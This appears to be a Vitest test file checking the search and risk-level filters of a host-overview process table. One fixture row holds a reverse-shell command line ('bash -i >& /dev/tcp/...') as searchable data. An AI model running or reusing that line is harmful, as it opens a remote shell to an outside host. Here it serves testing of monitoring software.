import { describe, expect, it } from "vitest";

import type { SystemInfoRow } from "../shared/system-info-contract";
import {
  EMPTY_SYSTEM_INFO_FILTER,
  filterSystemInfoRows,
  isSystemInfoFilterActive,
  systemInfoRiskCounts,
  type SystemInfoRowFilter,
} from "./system-info-helpers";

const row = (id: string, cells: string[], risk: SystemInfoRow["risk"] = "normal"): SystemInfoRow =>
  ({ id, cells, risk, detail: false });

// A process table: hidden 风险 column first, then PID, user, command.
const rows = [
  row("a", ["normal", "1", "root", "/sbin/init"]),
  row("b", ["high", "4242", "root", "/usr/bin/sshd -D"], "high"),
  row("c", ["warning", "500", "www-data", "nginx: worker process"], "warning"),
  row("d", ["normal", "777", "alice", "bash -i >& /dev/tcp/198.51.100.7/4444"]),
];
const ids = (filter: Partial<SystemInfoRowFilter>, searchable?: (index: number) => boolean) =>
  filterSystemInfoRows(rows, { ...EMPTY_SYSTEM_INFO_FILTER, ...filter }, searchable).map((kept) => kept.id);

describe("host overview search and filter", () => {
  it("keeps every row, in order, when nothing is set", () => {
    expect(ids({})).toEqual(["a", "b", "c", "d"]);
    expect(isSystemInfoFilterActive(EMPTY_SYSTEM_INFO_FILTER)).toBe(false);
    expect(isSystemInfoFilterActive({ ...EMPTY_SYSTEM_INFO_FILTER, query: "   " })).toBe(false);
  });

  it("finds a word in any column, ignoring case and surrounding space", () => {
    expect(ids({ query: "  SSHD " })).toEqual(["b"]);
    expect(ids({ query: "198.51.100.7" })).toEqual(["d"]);
  });

  it("needs every word, and lets each one match a different column", () => {
    expect(ids({ query: "root sshd" })).toEqual(["b"]);
    expect(ids({ query: "root nginx" })).toEqual([]);
  });

  it("searches one column when one is chosen", () => {
    // "root" is a user in column 2; it is not in any command.
    expect(ids({ query: "root", column: 2 })).toEqual(["a", "b"]);
    expect(ids({ query: "root", column: 3 })).toEqual([]);
    // A column the row does not have matches nothing, rather than throwing.
    expect(ids({ query: "root", column: 9 })).toEqual([]);
  });

  it("leaves hidden columns out of an all-column search", () => {
    const shown = (index: number) => index !== 0;
    expect(ids({ query: "high" }, shown)).toEqual([]);
    expect(ids({ query: "high" })).toEqual(["b"]);
  });

  it("filters by level, and counts what each level would keep", () => {
    expect(ids({ risk: "attention" })).toEqual(["b", "c"]);
    expect(ids({ risk: "high" })).toEqual(["b"]);
    expect(ids({ risk: "attention", query: "nginx" })).toEqual(["c"]);
    expect(systemInfoRiskCounts(rows)).toEqual({ all: 4, attention: 2, high: 1 });
    expect(isSystemInfoFilterActive({ ...EMPTY_SYSTEM_INFO_FILTER, risk: "high" })).toBe(true);
  });

  it("treats the query as text, not as a pattern", () => {
    expect(ids({ query: ".*" })).toEqual([]);
    expect(ids({ query: ">&" })).toEqual(["d"]);
  });
});
